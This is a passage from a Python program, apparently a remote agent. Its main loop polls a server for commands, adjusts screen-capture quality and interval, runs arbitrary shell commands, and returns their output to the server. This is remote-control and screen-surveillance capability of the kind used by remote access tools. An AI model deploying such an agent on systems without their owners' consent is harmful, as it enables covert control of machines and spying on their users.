                                output = {"stdout": f"Screen sharing: {status}\nDevice ID: {self.device_id}\nQuality: {self.screen_quality}\nInterval: {self.screen_interval} seconds", "stderr": "", "return_code": 0}
                            
                            elif action.startswith("quality="):
                                try:
                                    quality = int(action.split("=")[1])
                                    if 10 <= quality <= 100:
                                        self.screen_quality = quality
                                        output = {"stdout": f"Screen quality set to {quality}", "stderr": "", "return_code": 0}
                                    else:
                                        output = {"stdout": "", "stderr": "Quality must be between 10 and 100", "return_code": 1}
                                except:
                                    output = {"stdout": "", "stderr": "Invalid quality value", "return_code": 1}
                            
                            elif action.startswith("interval="):
                                try:
                                    interval = float(action.split("=")[1])
                                    if 0.1 <= interval <= 5.0:
                                        self.screen_interval = interval
                                        output = {"stdout": f"Screen capture interval set to {interval} seconds", "stderr": "", "return_code": 0}
                                    else:
                                        output = {"stdout": "", "stderr": "Interval must be between 0.1 and 5.0 seconds", "return_code": 1}
                                except:
                                    output = {"stdout": "", "stderr": "Invalid interval value", "return_code": 1}
                            
                            else:
                                output = {"stdout": "", "stderr": "Unknown screen command. Available: start, stop, status, quality=N, interval=N", "return_code": 1}
                        
                        else:
                            # Unknown special command
                            output = {"stdout": "", "stderr": f"Unknown special command: {cmd}", "return_code": 1}
                    
                    else:
                        # Regular command execution
                        print(f"Executing command: {cmd}")
                        output = self.execute_command(cmd)
                    
                    # Send the command output back to the server
                    self.send_command_output(command_id, output)
                
                # Sleep to avoid excessive polling
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\nReceiver stopped.")
            if self.screen_sharing_active:
                self.stop_screen_sharing()
        except Exception as e:
            print(f"Error in main loop: {str(e)}")
            if self.screen_sharing_active:
                self.stop_screen_sharing()

if __name__ == "__main__":
    # Allow server URL to be overridden via command line argument
    if len(sys.argv) > 1:
        SERVER_URL = sys.argv[1]
    
    # Create and run the receiver
    receiver = Receiver(SERVER_URL)
    receiver.run()
